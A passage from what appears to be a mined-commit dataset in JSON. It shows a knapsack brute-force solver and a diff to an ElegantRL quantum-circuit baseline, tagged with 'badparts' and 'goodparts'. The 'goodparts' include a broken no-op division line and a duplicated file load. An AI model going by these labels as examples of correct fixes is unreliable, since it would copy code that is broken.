\"):\r w_list.append(int(w))\r \r for v in lines[3].split(\", \"):\r v_list.append(int(v))\r \r for c in lines[4].split(\", \"):\r c_list.append(int(c))\r \r return max_w, num_c, w_list, v_list, c_list\r \r \r def write_solution_to_file(file_handle, total_value, model, num_of_objects):\r file_handle.write(str(total_value) +\"\\n\")\r file_handle.write(str(model & 1))\r for k in range(1, num_of_objects):\r file_handle.write(\", \" +str((model >> k) & 1))\r \r \r def brute_force(weights, values, classes, max_capacity, num_classes):\r def evaluation_function(model):\r classes_chosen=0\r total_weight=0\r total_value=0\r \r for idx in range(len(weight_list)):\r if(model[0] >> idx) & 1==1:\r total_weight +=weights[idx]\r \r if total_weight > max_capacity:\r return 0\r \r total_value +=values[idx]\r classes_chosen |=1 <<(classes[idx] -1)\r \r if classes_chosen !=2 ** num_classes -1:\r return 0\r \r return total_value\r \r def solve(solution, best_value, model, model_length):\r if model_length[0]==len(weights):\r evaluation_value=evaluation_function(model)\r \r if evaluation_value > best_value[0]:\r best_value[0]=evaluation_value\r solution[0]=model[0]\r \r return\r \r model_length[0] +=1\r solve(solution, best_value, model, model_length)\r \r model_length[0] -=1\r model[0] ^=1 << model_length[0]\r \r model_length[0] +=1\r solve(solution, best_value, model, model_length)\r \r model_length[0] -=1\r model[0] ^=1 << model_length[0]\r \r solution_model=[0]\r solution_value=[0]\r \r state=[0]\r state_length=[0]\r \r solve(solution_model, solution_value, state, state_length)\r return solution_model[0], solution_value[0]\r \r \r if __name__==\"__main__\":\r num_of_files=int(input(\"Enter number of input files: \"))\r for i in range(1, num_of_files +1):\r with open(f\"INPUT_{i}.txt\", \"r\") as input_file, open(f\"OUTPUT_{i}.txt\", \"w\") as output_file:\r max_weight, num_of_classes, weight_list, value_list, class_list=read_data_from_file(input_file)\r sol, sol_val=brute_force(weight_list, value_list, class_list, max_weight, num_of_classes)\r write_solution_to_file(output_file, sol_val, sol, len(weight_list))\r ","sourceWithComments":"import sys\r\nsys.set_int_max_str_digits(0)\r\n\r\n\r\ndef read_data_from_file(file_handle):\r\n    lines = file_handle.readlines()\r\n    max_w, num_c = int(lines[0]), int(lines[1])\r\n\r\n    w_list = []\r\n    v_list = []\r\n    c_list = []\r\n\r\n    for w in lines[2].split(\", \"):\r\n        w_list.append(int(w))\r\n\r\n    for v in lines[3].split(\", \"):\r\n        v_list.append(int(v))\r\n\r\n    for c in lines[4].split(\", \"):\r\n        c_list.append(int(c))\r\n\r\n    return max_w, num_c, w_list, v_list, c_list\r\n\r\n\r\ndef write_solution_to_file(file_handle, total_value, model, num_of_objects):\r\n    file_handle.write(str(total_value) + \"\\n\")\r\n    file_handle.write(str(model & 1))\r\n    for k in range(1, num_of_objects):\r\n        file_handle.write(\", \" + str((model >> k) & 1))\r\n\r\n\r\ndef brute_force(weights, values, classes, max_capacity, num_classes):\r\n    def evaluation_function(model):\r\n        classes_chosen = 0\r\n        total_weight = 0\r\n        total_value = 0\r\n\r\n        for idx in range(len(weight_list)):\r\n            if (model[0] >> idx) & 1 == 1:\r\n                total_weight += weights[idx]\r\n\r\n                if total_weight > max_capacity:\r\n                    return 0\r\n\r\n                total_value += values[idx]\r\n                classes_chosen |= 1 << (classes[idx] - 1)\r\n\r\n        if classes_chosen != 2 ** num_classes - 1:\r\n            return 0\r\n\r\n        return total_value\r\n\r\n    def solve(solution, best_value, model, model_length):\r\n        if model_length[0] == len(weights):\r\n            evaluation_value = evaluation_function(model)\r\n\r\n            if evaluation_value > best_value[0]:\r\n                best_value[0] = evaluation_value\r\n                solution[0] = model[0]\r\n\r\n            return\r\n\r\n        model_length[0] += 1\r\n        solve(solution, best_value, model, model_length)\r\n\r\n        model_length[0] -= 1\r\n        model[0] ^= 1 << model_length[0]\r\n\r\n        model_length[0] += 1\r\n        solve(solution, best_value, model, model_length)\r\n\r\n        model_length[0] -= 1\r\n        model[0] ^= 1 << model_length[0]\r\n\r\n    solution_model = [0]\r\n    solution_value = [0]\r\n\r\n    state = [0]\r\n    state_length = [0]\r\n\r\n    solve(solution_model, solution_value, state, state_length)\r\n    return solution_model[0], solution_value[0]\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    num_of_files = int(input(\"Enter number of input files: \"))\r\n    for i in range(1, num_of_files + 1):\r\n        with open(f\"INPUT_{i}.txt\", \"r\") as input_file, open(f\"OUTPUT_{i}.txt\", \"w\") as output_file:\r\n            max_weight, num_of_classes, weight_list, value_list, class_list = read_data_from_file(input_file)\r\n            sol, sol_val = brute_force(weight_list, value_list, class_list, max_weight, num_of_classes)\r\n            write_solution_to_file(output_file, sol_val, sol, len(weight_list))\r\n"}},"msg":"Update brute_force.py"}},"https:\/\/github.com\/AI4Finance-Foundation\/ElegantRL_Solver":{"5972c7fb50faa194ffc993a50c3ffe39209487d9":{"url":"https:\/\/api.github.com\/repos\/AI4Finance-Foundation\/ElegantRL_Solver\/commits\/5972c7fb50faa194ffc993a50c3ffe39209487d9","html_url":"https:\/\/github.com\/AI4Finance-Foundation\/ElegantRL_Solver\/commit\/5972c7fb50faa194ffc993a50c3ffe39209487d9","sha":"5972c7fb50faa194ffc993a50c3ffe39209487d9","keyword":"brute force update","diff":"diff --git a\/rlsolver\/rlsolver_quantum_circuits\/baseline_brute_force.py b\/rlsolver\/rlsolver_quantum_circuits\/baseline_brute_force.py\nindex e7436c6..90b10bd 100644\n--- a\/rlsolver\/rlsolver_quantum_circuits\/baseline_brute_force.py\n+++ b\/rlsolver\/rlsolver_quantum_circuits\/baseline_brute_force.py\n@@ -4,17 +4,21 @@\n device = th.device(\"cuda:0\")\n reward = 0\n N = 4\n-\n-with open(f\"test_data_tensor_train_N={N}.pkl\", 'rb') as f:\n-    a = pkl.load(f).detach().cpu()\n+with open(f\"test_{N}.pkl\", 'rb') as f:\n+    a = pkl.load(f)\n num_env = a.shape[0]\n start_ =  th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\n end_ =  th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\n reward = th.zeros(num_env, 6)\n-permute_list = th.as_tensor([[0, 1, 2], [0, 2, 1], [1, 0, 2], [1, 2, 0], [2, 0, 1], [2, 1, 0]])\n+with open(f\"test_{N}.pkl\", 'rb') as f:\n+    a = pkl.load(f)\n+# permute_list = th.as_tensor([[0, 1, 2], [0, 2, 1], [1, 0, 2], [1, 2, 0], [2, 0, 1], [2, 1, 0]])\n \n+permute_list = th.as_tensor([\n+[ 0 , 1 , 2 , 3 , 4 ], [ 0 , 1 , 2 , 4 , 3 ], [ 0 , 1 , 3 , 2 , 4 ], [ 0 , 1 , 3 , 4 , 2 ], [ 0 , 1 , 4 , 2 , 3 ], [ 0 , 1 , 4 , 3 , 2 ], [ 0 , 2 , 1 , 3 , 4 ], [ 0 , 2 , 1 , 4 , 3 ], [ 0 , 2 , 3 , 1 , 4 ], [ 0 , 2 , 3 , 4 , 1 ], [ 0 , 2 , 4 , 1 , 3 ], [ 0 , 2 , 4 , 3 , 1 ], [ 0 , 3 , 1 , 2 , 4 ], [ 0 , 3 , 1 , 4 , 2 ], [ 0 , 3 , 2 , 1 , 4 ], [ 0 , 3 , 2 , 4 , 1 ], [ 0 , 3 , 4 , 1 , 2 ], [ 0 , 3 , 4 , 2 , 1 ], [ 0 , 4 , 1 , 2 , 3 ], [ 0 , 4 , 1 , 3 , 2 ], [ 0 , 4 , 2 , 1 , 3 ], [ 0 , 4 , 2 , 3 , 1 ], [ 0 , 4 , 3 , 1 , 2 ], [ 0 , 4 , 3 , 2 , 1 ], [ 1 , 0 , 2 , 3 , 4 ], [ 1 , 0 , 2 , 4 , 3 ], [ 1 , 0 , 3 , 2 , 4 ], [ 1 , 0 , 3 , 4 , 2 ], [ 1 , 0 , 4 , 2 , 3 ], [ 1 , 0 , 4 , 3 , 2 ], [ 1 , 2 , 0 , 3 , 4 ], [ 1 , 2 , 0 , 4 , 3 ], [ 1 , 2 , 3 , 0 , 4 ], [ 1 , 2 , 3 , 4 , 0 ], [ 1 , 2 , 4 , 0 , 3 ], [ 1 , 2 , 4 , 3 , 0 ], [ 1 , 3 , 0 , 2 , 4 ], [ 1 , 3 , 0 , 4 , 2 ], [ 1 , 3 , 2 , 0 , 4 ], [ 1 , 3 , 2 , 4 , 0 ], [ 1 , 3 , 4 , 0 , 2 ], [ 1 , 3 , 4 , 2 , 0 ], [ 1 , 4 , 0 , 2 , 3 ], [ 1 , 4 , 0 , 3 , 2 ], [ 1 , 4 , 2 , 0 , 3 ], [ 1 , 4 , 2 , 3 , 0 ], [ 1 , 4 , 3 , 0 , 2 ], [ 1 , 4 , 3 , 2 , 0 ], [ 2 , 0 , 1 , 3 , 4 ], [ 2 , 0 , 1 , 4 , 3 ], [ 2 , 0 , 3 , 1 , 4 ], [ 2 , 0 , 3 , 4 , 1 ], [ 2 , 0 , 4 , 1 , 3 ], [ 2 , 0 , 4 , 3 , 1 ], [ 2 , 1 , 0 , 3 , 4 ], [ 2 , 1 , 0 , 4 , 3 ], [ 2 , 1 , 3 , 0 , 4 ], [ 2 , 1 , 3 , 4 , 0 ], [ 2 , 1 , 4 , 0 , 3 ], [ 2 , 1 , 4 , 3 , 0 ], [ 2 , 3 , 0 , 1 , 4 ], [ 2 , 3 , 0 , 4 , 1 ], [ 2 , 3 , 1 , 0 , 4 ], [ 2 , 3 , 1 , 4 , 0 ], [ 2 , 3 , 4 , 0 , 1 ], [ 2 , 3 , 4 , 1 , 0 ], [ 2 , 4 , 0 , 1 , 3 ], [ 2 , 4 , 0 , 3 , 1 ], [ 2 , 4 , 1 , 0 , 3 ], [ 2 , 4 , 1 , 3 , 0 ], [ 2 , 4 , 3 , 0 , 1 ], [ 2 , 4 , 3 , 1 , 0 ], [ 3 , 0 , 1 , 2 , 4 ], [ 3 , 0 , 1 , 4 , 2 ], [ 3 , 0 , 2 , 1 , 4 ], [ 3 , 0 , 2 , 4 , 1 ], [ 3 , 0 , 4 , 1 , 2 ], [ 3 , 0 , 4 , 2 , 1 ], [ 3 , 1 , 0 , 2 , 4 ], [ 3 , 1 , 0 , 4 , 2 ], [ 3 , 1 , 2 , 0 , 4 ], [ 3 , 1 , 2 , 4 , 0 ], [ 3 , 1 , 4 , 0 , 2 ], [ 3 , 1 , 4 , 2 , 0 ], [ 3 , 2 , 0 , 1 , 4 ], [ 3 , 2 , 0 , 4 , 1 ], [ 3 , 2 , 1 , 0 , 4 ], [ 3 , 2 , 1 , 4 , 0 ], [ 3 , 2 , 4 , 0 , 1 ], [ 3 , 2 , 4 , 1 , 0 ], [ 3 , 4 , 0 , 1 , 2 ], [ 3 , 4 , 0 , 2 , 1 ], [ 3 , 4 , 1 , 0 , 2 ], [ 3 , 4 , 1 , 2 , 0 ], [ 3 , 4 , 2 , 0 , 1 ], [ 3 , 4 , 2 , 1 , 0 ], [ 4 , 0 , 1 , 2 , 3 ], [ 4 , 0 , 1 , 3 , 2 ], [ 4 , 0 , 2 , 1 , 3 ], [ 4 , 0 , 2 , 3 , 1 ], [ 4 , 0 , 3 , 1 , 2 ], [ 4 , 0 , 3 , 2 , 1 ], [ 4 , 1 , 0 , 2 , 3 ], [ 4 , 1 , 0 , 3 , 2 ], [ 4 , 1 , 2 , 0 , 3 ], [ 4 , 1 , 2 , 3 , 0 ], [ 4 , 1 , 3 , 0 , 2 ], [ 4 , 1 , 3 , 2 , 0 ], [ 4 , 2 , 0 , 1 , 3 ], [ 4 , 2 , 0 , 3 , 1 ], [ 4 , 2 , 1 , 0 , 3 ], [ 4 , 2 , 1 , 3 , 0 ], [ 4 , 2 , 3 , 0 , 1 ], [ 4 , 2 , 3 , 1 , 0 ], [ 4 , 3 , 0 , 1 , 2 ], [ 4 , 3 , 0 , 2 , 1 ], [ 4 , 3 , 1 , 0 , 2 ], [ 4 , 3 , 1 , 2 , 0 ], [ 4 , 3 , 2 , 0 , 1 ], [ 4 , 3 , 2 , 1 , 0 ],\n+])\n \n-for k in range(num_env):\n+for k in range(a.shape[0]):\n     for permute_i in range(6):\n         permute = permute_list[permute_i]\n         r = 0\n@@ -27,18 +31,18 @@\n                 tmp *= (state[j, j] * state[j, start[i] - 1] * state[end[i] + 1, j])\n             for j in range(start[i + 1], end[i + 1] + 1):\n                 tmp *= (state[j, j] * state[j, start[i + 1] - 1] * state[end[i + 1] + 1, j])\n-            tmp = tmp \/ state[start[i + 1], start[i + 1] - 1]\n+            tmp \/ state[start[i + 1], start[i + 1] - 1]\n             start_new = min(start[i], start[i + 1])\n             end_new = max(end[i], end[i + 1])\n             for __ in range(start_new, end_new + 1):\n                 start[__-1] = start_new\n                 end[__-1] = end_new\n-\n             r += tmp\n         reward[k, permute_i] = r\n-    print(reward[k], permute_list[reward[k].min(dim=-1)[1]])\n-print(reward.min(dim=-1)[0].mean())\n+    print(reward[k], reward[k].min())\n+    #assert 0\n+print(reward.min(dim = -1))\n+print(reward.min(dim = -1)[0].mean())\n with open(\"record_r.pkl\", \"wb\") as f:\n     import pickle as pkl\n     pkl.dump(reward, f)\n-\n","message":"","files":{"\/rlsolver\/rlsolver_quantum_circuits\/baseline_brute_force.py":{"changes":[{"diff":"\n device = th.device(\"cuda:0\")\n reward = 0\n N = 4\n-\n-with open(f\"test_data_tensor_train_N={N}.pkl\", 'rb') as f:\n-    a = pkl.load(f).detach().cpu()\n+with open(f\"test_{N}.pkl\", 'rb') as f:\n+    a = pkl.load(f)\n num_env = a.shape[0]\n start_ =  th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\n end_ =  th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\n reward = th.zeros(num_env, 6)\n-permute_list = th.as_tensor([[0, 1, 2], [0, 2, 1], [1, 0, 2], [1, 2, 0], [2, 0, 1], [2, 1, 0]])\n+with open(f\"test_{N}.pkl\", 'rb') as f:\n+    a = pkl.load(f)\n+# permute_list = th.as_tensor([[0, 1, 2], [0, 2, 1], [1, 0, 2], [1, 2, 0], [2, 0, 1], [2, 1, 0]])\n \n+permute_list = th.as_tensor([\n+[ 0 , 1 , 2 , 3 , 4 ], [ 0 , 1 , 2 , 4 , 3 ], [ 0 , 1 , 3 , 2 , 4 ], [ 0 , 1 , 3 , 4 , 2 ], [ 0 , 1 , 4 , 2 , 3 ], [ 0 , 1 , 4 , 3 , 2 ], [ 0 , 2 , 1 , 3 , 4 ], [ 0 , 2 , 1 , 4 , 3 ], [ 0 , 2 , 3 , 1 , 4 ], [ 0 , 2 , 3 , 4 , 1 ], [ 0 , 2 , 4 , 1 , 3 ], [ 0 , 2 , 4 , 3 , 1 ], [ 0 , 3 , 1 , 2 , 4 ], [ 0 , 3 , 1 , 4 , 2 ], [ 0 , 3 , 2 , 1 , 4 ], [ 0 , 3 , 2 , 4 , 1 ], [ 0 , 3 , 4 , 1 , 2 ], [ 0 , 3 , 4 , 2 , 1 ], [ 0 , 4 , 1 , 2 , 3 ], [ 0 , 4 , 1 , 3 , 2 ], [ 0 , 4 , 2 , 1 , 3 ], [ 0 , 4 , 2 , 3 , 1 ], [ 0 , 4 , 3 , 1 , 2 ], [ 0 , 4 , 3 , 2 , 1 ], [ 1 , 0 , 2 , 3 , 4 ], [ 1 , 0 , 2 , 4 , 3 ], [ 1 , 0 , 3 , 2 , 4 ], [ 1 , 0 , 3 , 4 , 2 ], [ 1 , 0 , 4 , 2 , 3 ], [ 1 , 0 , 4 , 3 , 2 ], [ 1 , 2 , 0 , 3 , 4 ], [ 1 , 2 , 0 , 4 , 3 ], [ 1 , 2 , 3 , 0 , 4 ], [ 1 , 2 , 3 , 4 , 0 ], [ 1 , 2 , 4 , 0 , 3 ], [ 1 , 2 , 4 , 3 , 0 ], [ 1 , 3 , 0 , 2 , 4 ], [ 1 , 3 , 0 , 4 , 2 ], [ 1 , 3 , 2 , 0 , 4 ], [ 1 , 3 , 2 , 4 , 0 ], [ 1 , 3 , 4 , 0 , 2 ], [ 1 , 3 , 4 , 2 , 0 ], [ 1 , 4 , 0 , 2 , 3 ], [ 1 , 4 , 0 , 3 , 2 ], [ 1 , 4 , 2 , 0 , 3 ], [ 1 , 4 , 2 , 3 , 0 ], [ 1 , 4 , 3 , 0 , 2 ], [ 1 , 4 , 3 , 2 , 0 ], [ 2 , 0 , 1 , 3 , 4 ], [ 2 , 0 , 1 , 4 , 3 ], [ 2 , 0 , 3 , 1 , 4 ], [ 2 , 0 , 3 , 4 , 1 ], [ 2 , 0 , 4 , 1 , 3 ], [ 2 , 0 , 4 , 3 , 1 ], [ 2 , 1 , 0 , 3 , 4 ], [ 2 , 1 , 0 , 4 , 3 ], [ 2 , 1 , 3 , 0 , 4 ], [ 2 , 1 , 3 , 4 , 0 ], [ 2 , 1 , 4 , 0 , 3 ], [ 2 , 1 , 4 , 3 , 0 ], [ 2 , 3 , 0 , 1 , 4 ], [ 2 , 3 , 0 , 4 , 1 ], [ 2 , 3 , 1 , 0 , 4 ], [ 2 , 3 , 1 , 4 , 0 ], [ 2 , 3 , 4 , 0 , 1 ], [ 2 , 3 , 4 , 1 , 0 ], [ 2 , 4 , 0 , 1 , 3 ], [ 2 , 4 , 0 , 3 , 1 ], [ 2 , 4 , 1 , 0 , 3 ], [ 2 , 4 , 1 , 3 , 0 ], [ 2 , 4 , 3 , 0 , 1 ], [ 2 , 4 , 3 , 1 , 0 ], [ 3 , 0 , 1 , 2 , 4 ], [ 3 , 0 , 1 , 4 , 2 ], [ 3 , 0 , 2 , 1 , 4 ], [ 3 , 0 , 2 , 4 , 1 ], [ 3 , 0 , 4 , 1 , 2 ], [ 3 , 0 , 4 , 2 , 1 ], [ 3 , 1 , 0 , 2 , 4 ], [ 3 , 1 , 0 , 4 , 2 ], [ 3 , 1 , 2 , 0 , 4 ], [ 3 , 1 , 2 , 4 , 0 ], [ 3 , 1 , 4 , 0 , 2 ], [ 3 , 1 , 4 , 2 , 0 ], [ 3 , 2 , 0 , 1 , 4 ], [ 3 , 2 , 0 , 4 , 1 ], [ 3 , 2 , 1 , 0 , 4 ], [ 3 , 2 , 1 , 4 , 0 ], [ 3 , 2 , 4 , 0 , 1 ], [ 3 , 2 , 4 , 1 , 0 ], [ 3 , 4 , 0 , 1 , 2 ], [ 3 , 4 , 0 , 2 , 1 ], [ 3 , 4 , 1 , 0 , 2 ], [ 3 , 4 , 1 , 2 , 0 ], [ 3 , 4 , 2 , 0 , 1 ], [ 3 , 4 , 2 , 1 , 0 ], [ 4 , 0 , 1 , 2 , 3 ], [ 4 , 0 , 1 , 3 , 2 ], [ 4 , 0 , 2 , 1 , 3 ], [ 4 , 0 , 2 , 3 , 1 ], [ 4 , 0 , 3 , 1 , 2 ], [ 4 , 0 , 3 , 2 , 1 ], [ 4 , 1 , 0 , 2 , 3 ], [ 4 , 1 , 0 , 3 , 2 ], [ 4 , 1 , 2 , 0 , 3 ], [ 4 , 1 , 2 , 3 , 0 ], [ 4 , 1 , 3 , 0 , 2 ], [ 4 , 1 , 3 , 2 , 0 ], [ 4 , 2 , 0 , 1 , 3 ], [ 4 , 2 , 0 , 3 , 1 ], [ 4 , 2 , 1 , 0 , 3 ], [ 4 , 2 , 1 , 3 , 0 ], [ 4 , 2 , 3 , 0 , 1 ], [ 4 , 2 , 3 , 1 , 0 ], [ 4 , 3 , 0 , 1 , 2 ], [ 4 , 3 , 0 , 2 , 1 ], [ 4 , 3 , 1 , 0 , 2 ], [ 4 , 3 , 1 , 2 , 0 ], [ 4 , 3 , 2 , 0 , 1 ], [ 4 , 3 , 2 , 1 , 0 ],\n+])\n \n-for k in range(num_env):\n+for k in range(a.shape[0]):\n     for permute_i in range(6):\n         permute = permute_list[permute_i]\n         r = 0\n","add":9,"remove":5,"filename":"\/rlsolver\/rlsolver_quantum_circuits\/baseline_brute_force.py","badparts":["with open(f\"test_data_tensor_train_N={N}.pkl\", 'rb') as f:","    a = pkl.load(f).detach().cpu()","permute_list = th.as_tensor([[0, 1, 2], [0, 2, 1], [1, 0, 2], [1, 2, 0], [2, 0, 1], [2, 1, 0]])","for k in range(num_env):"],"goodparts":["with open(f\"test_{N}.pkl\", 'rb') as f:","    a = pkl.load(f)","with open(f\"test_{N}.pkl\", 'rb') as f:","    a = pkl.load(f)","permute_list = th.as_tensor([","[ 0 , 1 , 2 , 3 , 4 ], [ 0 , 1 , 2 , 4 , 3 ], [ 0 , 1 , 3 , 2 , 4 ], [ 0 , 1 , 3 , 4 , 2 ], [ 0 , 1 , 4 , 2 , 3 ], [ 0 , 1 , 4 , 3 , 2 ], [ 0 , 2 , 1 , 3 , 4 ], [ 0 , 2 , 1 , 4 , 3 ], [ 0 , 2 , 3 , 1 , 4 ], [ 0 , 2 , 3 , 4 , 1 ], [ 0 , 2 , 4 , 1 , 3 ], [ 0 , 2 , 4 , 3 , 1 ], [ 0 , 3 , 1 , 2 , 4 ], [ 0 , 3 , 1 , 4 , 2 ], [ 0 , 3 , 2 , 1 , 4 ], [ 0 , 3 , 2 , 4 , 1 ], [ 0 , 3 , 4 , 1 , 2 ], [ 0 , 3 , 4 , 2 , 1 ], [ 0 , 4 , 1 , 2 , 3 ], [ 0 , 4 , 1 , 3 , 2 ], [ 0 , 4 , 2 , 1 , 3 ], [ 0 , 4 , 2 , 3 , 1 ], [ 0 , 4 , 3 , 1 , 2 ], [ 0 , 4 , 3 , 2 , 1 ], [ 1 , 0 , 2 , 3 , 4 ], [ 1 , 0 , 2 , 4 , 3 ], [ 1 , 0 , 3 , 2 , 4 ], [ 1 , 0 , 3 , 4 , 2 ], [ 1 , 0 , 4 , 2 , 3 ], [ 1 , 0 , 4 , 3 , 2 ], [ 1 , 2 , 0 , 3 , 4 ], [ 1 , 2 , 0 , 4 , 3 ], [ 1 , 2 , 3 , 0 , 4 ], [ 1 , 2 , 3 , 4 , 0 ], [ 1 , 2 , 4 , 0 , 3 ], [ 1 , 2 , 4 , 3 , 0 ], [ 1 , 3 , 0 , 2 , 4 ], [ 1 , 3 , 0 , 4 , 2 ], [ 1 , 3 , 2 , 0 , 4 ], [ 1 , 3 , 2 , 4 , 0 ], [ 1 , 3 , 4 , 0 , 2 ], [ 1 , 3 , 4 , 2 , 0 ], [ 1 , 4 , 0 , 2 , 3 ], [ 1 , 4 , 0 , 3 , 2 ], [ 1 , 4 , 2 , 0 , 3 ], [ 1 , 4 , 2 , 3 , 0 ], [ 1 , 4 , 3 , 0 , 2 ], [ 1 , 4 , 3 , 2 , 0 ], [ 2 , 0 , 1 , 3 , 4 ], [ 2 , 0 , 1 , 4 , 3 ], [ 2 , 0 , 3 , 1 , 4 ], [ 2 , 0 , 3 , 4 , 1 ], [ 2 , 0 , 4 , 1 , 3 ], [ 2 , 0 , 4 , 3 , 1 ], [ 2 , 1 , 0 , 3 , 4 ], [ 2 , 1 , 0 , 4 , 3 ], [ 2 , 1 , 3 , 0 , 4 ], [ 2 , 1 , 3 , 4 , 0 ], [ 2 , 1 , 4 , 0 , 3 ], [ 2 , 1 , 4 , 3 , 0 ], [ 2 , 3 , 0 , 1 , 4 ], [ 2 , 3 , 0 , 4 , 1 ], [ 2 , 3 , 1 , 0 , 4 ], [ 2 , 3 , 1 , 4 , 0 ], [ 2 , 3 , 4 , 0 , 1 ], [ 2 , 3 , 4 , 1 , 0 ], [ 2 , 4 , 0 , 1 , 3 ], [ 2 , 4 , 0 , 3 , 1 ], [ 2 , 4 , 1 , 0 , 3 ], [ 2 , 4 , 1 , 3 , 0 ], [ 2 , 4 , 3 , 0 , 1 ], [ 2 , 4 , 3 , 1 , 0 ], [ 3 , 0 , 1 , 2 , 4 ], [ 3 , 0 , 1 , 4 , 2 ], [ 3 , 0 , 2 , 1 , 4 ], [ 3 , 0 , 2 , 4 , 1 ], [ 3 , 0 , 4 , 1 , 2 ], [ 3 , 0 , 4 , 2 , 1 ], [ 3 , 1 , 0 , 2 , 4 ], [ 3 , 1 , 0 , 4 , 2 ], [ 3 , 1 , 2 , 0 , 4 ], [ 3 , 1 , 2 , 4 , 0 ], [ 3 , 1 , 4 , 0 , 2 ], [ 3 , 1 , 4 , 2 , 0 ], [ 3 , 2 , 0 , 1 , 4 ], [ 3 , 2 , 0 , 4 , 1 ], [ 3 , 2 , 1 , 0 , 4 ], [ 3 , 2 , 1 , 4 , 0 ], [ 3 , 2 , 4 , 0 , 1 ], [ 3 , 2 , 4 , 1 , 0 ], [ 3 , 4 , 0 , 1 , 2 ], [ 3 , 4 , 0 , 2 , 1 ], [ 3 , 4 , 1 , 0 , 2 ], [ 3 , 4 , 1 , 2 , 0 ], [ 3 , 4 , 2 , 0 , 1 ], [ 3 , 4 , 2 , 1 , 0 ], [ 4 , 0 , 1 , 2 , 3 ], [ 4 , 0 , 1 , 3 , 2 ], [ 4 , 0 , 2 , 1 , 3 ], [ 4 , 0 , 2 , 3 , 1 ], [ 4 , 0 , 3 , 1 , 2 ], [ 4 , 0 , 3 , 2 , 1 ], [ 4 , 1 , 0 , 2 , 3 ], [ 4 , 1 , 0 , 3 , 2 ], [ 4 , 1 , 2 , 0 , 3 ], [ 4 , 1 , 2 , 3 , 0 ], [ 4 , 1 , 3 , 0 , 2 ], [ 4 , 1 , 3 , 2 , 0 ], [ 4 , 2 , 0 , 1 , 3 ], [ 4 , 2 , 0 , 3 , 1 ], [ 4 , 2 , 1 , 0 , 3 ], [ 4 , 2 , 1 , 3 , 0 ], [ 4 , 2 , 3 , 0 , 1 ], [ 4 , 2 , 3 , 1 , 0 ], [ 4 , 3 , 0 , 1 , 2 ], [ 4 , 3 , 0 , 2 , 1 ], [ 4 , 3 , 1 , 0 , 2 ], [ 4 , 3 , 1 , 2 , 0 ], [ 4 , 3 , 2 , 0 , 1 ], [ 4 , 3 , 2 , 1 , 0 ],","])","for k in range(a.shape[0]):"]},{"diff":"                 tmp *= (state[j, j] * state[j, start[i] - 1] * state[end[i] + 1, j])\n             for j in range(start[i + 1], end[i + 1] + 1):\n                 tmp *= (state[j, j] * state[j, start[i + 1] - 1] * state[end[i + 1] + 1, j])\n-            tmp = tmp \/ state[start[i + 1], start[i + 1] - 1]\n+            tmp \/ state[start[i + 1], start[i + 1] - 1]\n             start_new = min(start[i], start[i + 1])\n             end_new = max(end[i], end[i + 1])\n             for __ in range(start_new, end_new + 1):\n                 start[__-1] = start_new\n                 end[__-1] = end_new\n-\n             r += tmp\n         reward[k, permute_i] = r\n-    print(reward[k], permute_list[reward[k].min(dim=-1)[1]])\n-print(reward.min(dim=-1)[0].mean())\n+    print(reward[k], reward[k].min())\n+    #assert 0\n+print(reward.min(dim = -1))\n+print(reward.min(dim = -1)[0].mean())\n with open(\"record_r.pkl\", \"wb\") as f:\n     import pickle as pkl\n     pkl.dump(reward, f)\n-\n","add":5,"remove":5,"filename":"\/rlsolver\/rlsolver_quantum_circuits\/baseline_brute_force.py","badparts":["            tmp = tmp \/ state[start[i + 1], start[i + 1] - 1]","    print(reward[k], permute_list[reward[k].min(dim=-1)[1]])","print(reward.min(dim=-1)[0].mean())"],"goodparts":["            tmp \/ state[start[i + 1], start[i + 1] - 1]","    print(reward[k], reward[k].min())","print(reward.min(dim = -1))","print(reward.min(dim = -1)[0].mean())"]}],"source":"\nimport pickle as pkl import torch as th from copy import deepcopy device=th.device(\"cuda:0\") reward=0 N=4 with open(f\"test_data_tensor_train_N={N}.pkl\", 'rb') as f: a=pkl.load(f).detach().cpu() num_env=a.shape[0] start_= th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device) end_= th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device) reward=th.zeros(num_env, 6) permute_list=th.as_tensor([[0, 1, 2],[0, 2, 1],[1, 0, 2],[1, 2, 0],[2, 0, 1],[2, 1, 0]]) for k in range(num_env): for permute_i in range(6): permute=permute_list[permute_i] r=0 state=a[k] start=deepcopy(start_[k]) +1 end=deepcopy(end_[k]) +1 for i in permute: tmp=1 for j in range(start[i], end[i] +1): tmp *=(state[j, j] * state[j, start[i] -1] * state[end[i] +1, j]) for j in range(start[i +1], end[i +1] +1): tmp *=(state[j, j] * state[j, start[i +1] -1] * state[end[i +1] +1, j]) tmp=tmp \/ state[start[i +1], start[i +1] -1] start_new=min(start[i], start[i +1]) end_new=max(end[i], end[i +1]) for __ in range(start_new, end_new +1): start[__-1]=start_new end[__-1]=end_new r +=tmp reward[k, permute_i]=r print(reward[k], permute_list[reward[k].min(dim=-1)[1]]) print(reward.min(dim=-1)[0].mean()) with open(\"record_r.pkl\", \"wb\") as f: import pickle as pkl pkl.dump(reward, f) ","sourceWithComments":"import pickle as pkl\nimport torch as th\nfrom copy import deepcopy\ndevice = th.device(\"cuda:0\")\nreward = 0\nN = 4\n\nwith open(f\"test_data_tensor_train_N={N}.pkl\", 'rb') as f:\n    a = pkl.load(f).detach().cpu()\nnum_env = a.shape[0]\nstart_ =  th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\nend_ =  th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\nreward = th.zeros(num_env, 6)\npermute_list = th.as_tensor([[0, 1, 2], [0, 2, 1], [1, 0, 2], [1, 2, 0], [2, 0, 1], [2, 1, 0]])\n\n\nfor k in range(num_env):\n    for permute_i in range(6):\n        permute = permute_list[permute_i]\n        r = 0\n        state = a[k]\n        start = deepcopy(start_[k]) + 1\n        end = deepcopy(end_[k]) + 1\n        for i in permute:\n            tmp = 1\n            for j in range(start[i], end[i] + 1):\n                tmp *= (state[j, j] * state[j, start[i] - 1] * state[end[i] + 1, j])\n            for j in range(start[i + 1], end[i + 1] + 1):\n                tmp *= (state[j, j] * state[j, start[i + 1] - 1] * state[end[i + 1] + 1, j])\n            